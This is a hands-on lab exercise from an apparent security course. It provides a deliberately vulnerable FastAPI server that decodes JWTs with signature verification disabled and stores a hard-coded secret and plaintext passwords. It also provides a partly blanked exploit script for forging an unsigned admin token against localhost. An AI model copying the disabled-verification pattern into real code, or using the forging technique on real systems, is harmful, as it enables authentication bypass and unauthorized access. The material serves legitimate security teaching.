---
title: Practice
---

This exercise puts you in a scenario similar to the one in the modules, where attackers exploited JWT authentication. Here, you will focus on simulating the potential impact and explore different types of attacks. This practice highlights the risks and consequences of weak or improper authentication.

## Environment Setup

For this exercise, we will use Python to create a script to interact with a vulnerable API. The script will be used to send forged JWTs to exploit weak or improper JWT authentication. Before we start, we will create a virtual environment to isolate the dependencies we need for this exercise.

**Virtual Environment:** A Python virtual environment is a self-contained directory that isolates different Python dependencies, allowing you to manage different versions of libraries for each project without conflicts.

```bash
# Create a virtual environment
python -m venv .venv

# Then activate the virtual environment

# On Windows
.venv\Scripts\activate

# On Unix or MacOS
source .venv/bin/activate
```

**Install Requirements:** This exercise uses external libraries and frameworks for the script and API. The dependencies we will need are Requests, Python-JOSE, and FastAPI to create, send, and receive JWTs through the API.

```bash
# Install Requests
python -m pip install requests

# Install Python-JOSE
python -m pip install python-jose

# Install FastAPI
python -m pip install "fastapi[standard]"
```

### The Vulnerable Program

The vulnerable program used in this exercise is called `server.py`. This program is a simple API with an endpoint to receive a JWT and a protected endpoint to use the JWT. This program is vulnerable to forged JWTs, and you will explore how to exploit this to access protected endpoints.

```python
# Save this as server.py
from datetime import datetime, timedelta, timezone

from fastapi import FastAPI, Header, HTTPException
from jose import JWTError, jwt
from pydantic import BaseModel

app = FastAPI()

# Secret keys for demonstration purposes
SECRET_KEY = "insecure_secret_key"
ALGORITHM = "HS256"

# Fake user database with roles
fake_user_db = {
    "user1": {"password": "password123", "role": "user"},
    "admin": {"password": "admin123", "role": "admin"},
}


# Input model for receiving credentials
class LoginRequest(BaseModel):
    username: str
    password: str


# Generates a JWT
def create_access_token(data: dict):
    to_encode = data.copy()
    to_encode["exp"] = datetime.now(timezone.utc) + timedelta(minutes=15)
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)


# Endpoint to receive a JWT if credentials are valid
@app.post("/login")
def login(request: LoginRequest):
    username = request.username
    password = request.password
    user = fake_user_db.get(username)

    if not user or user["password"] != password:
        raise HTTPException(status_code=401, detail="Invalid credentials")

    access_token = create_access_token({"sub": username, "role": user["role"]})
    return {"access_token": access_token, "token_type": "bearer"}


# Endpoint to access the admin data
@app.get("/admin")
def admin_data(authorization: str = Header(...)):
    try:
        # Extract the token from the "Authorization: Bearer <token>" header
        token = authorization.split("Bearer ")[-1]

        # Decode the JWT
        data = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM], options={"verify_signature": False})

        # Check the user's role
        if data.get("role") != "admin":
            raise HTTPException(status_code=403, detail="Forbidden: You do not have admin privileges.")

        return {"message": "Welcome admin!"}
    except JWTError:
        # Handle cases where the token decode fails
        raise HTTPException(status_code=401, detail="Invalid token")
```

### The Exploit Program

The exploit program used in this exercise is called `exploit.py`. This program is a script that can make requests to the vulnerable API. This will demonstrate how attackers can forge JWTs to access protected endpoints.

```python
# Save this as exploit.py

import base64
import json

import requests

# Base URL of the API server
BASE_URL = "http://127.0.0.1:8000"


# Task 1: Obtain a valid JWT
def get_valid_token(username, password):
    """Logs in with credentials and retrieves the JWT."""
    # Prepare the request data
    endpoint = "..."
    credentials = {...}

    response = requests.post(endpoint, json=credentials)

    if response.status_code == 200:
        # Retrieve the JWT token
        token = response.json().get("access_token")
        print(f"Valid JWT Token: {token}")

        # Decode the JWT token (splitting into header, payload, and signature)
        header, payload, signature = token.split(".")
        decoded_header = base64.urlsafe_b64decode(header + "==").decode()  # Decode header
        decoded_payload = base64.urlsafe_b64decode(payload + "==").decode()  # Decode payload

        # Display the decoded header and payload
        print("\nDecoded Header:")
        print(json.loads(decoded_header))
        print("\nDecoded Payload:")
        print(json.loads(decoded_payload))

        return token
    else:
        print(f"Failed to retrieve token: {response.status_code} - {response.json()}")


# Task 2: Forge a JWT to Escalate Privileges
def forge_token():
    """Creates a forged JWT."""
    # Prepare the JWT data
    header = {
        "alg": "...",
        "typ": "...",
    }
    payload = {
        "sub": "...",
        "role": "...",
    }

    # Encode the header and payload as base64 URL-safe strings
    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().strip("=")
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().strip("=")

    # Construct the token without a signature
    forged_token = "..."

    print(f"Forged JWT: {forged_token}")
    return forged_token


def use_token(endpoint, token):
    """Uses a JWT token to access an endpoint."""
    headers = {"Authorization": f"Bearer {token}"}

    response = requests.get(endpoint, headers=headers)

    try:
        print(f"Response: {response.status_code} - {response.json()}")
    except ValueError:
        print(f"Response: {response.status_code} - {response.text}")


if __name__ == "__main__":
    print("Task 1: Obtain a Valid JWT")
    username = "user1"
    password = "password123"
    valid_token = get_valid_token(username, password)

    # Uncomment to run Task 2

    # print("\nTask 2: Forge a JWT to Escalate Privileges")
    # admin_endpoint = f"{BASE_URL}/admin"
    # forged_token = forge_token()
    # use_token(admin_endpoint, forged_token)
```

### Common Commands

In the following, we list some common commands for this exercise.

```bash
# Start the exploit script
python /path/to/exploit.py

# Start the server for the API
fastapi dev /path/to/server.py

# To stop the server press CTRL+C to quit
```

## Task 1: Obtain a valid JWT

In this task, we will simulate how an attacker might attempt to learn about the authentication process by first obtaining a valid JWT. Your goal is to prepare the request data to log in and receive a JWT using valid credentials.

```python
def get_valid_token(username, password):
    ...
    # Prepare the request data
    endpoint = "..."
    credentials = {...}
    ...
```

When you finished preparing the request, start the vulnerable program and run the exploit script. If it works, the script will show the content of the JWT.

```python
Valid JWT Token: ...

Decoded Header:
{...}

Decoded Payload:
{...}
```

## Task 2: Forge a JWT to Escalate Privileges

In this task, we will simulate how an attacker might attempt to gain unauthorized access to a protected endpoint by forging a JWT. Your goal is to prepare the JWT data to make a forged token to bypass authentication.

```python
def forge_token(original_token):
    ...
    # Prepare the JWT data
    header = {
        "alg": "...",
        "typ": "...",
    }
    payload = {
        "sub": "...",
        "role": "...",
    }
    ...
    # Construct the token without a signature
    forged_token = "..."
    ...
```

When you finished forging a JWT, start the vulnerable program and run the exploit script. If it works, the server will respond with administrative access.

```python
Response: 200 - {'message': 'Welcome admin!'}
```
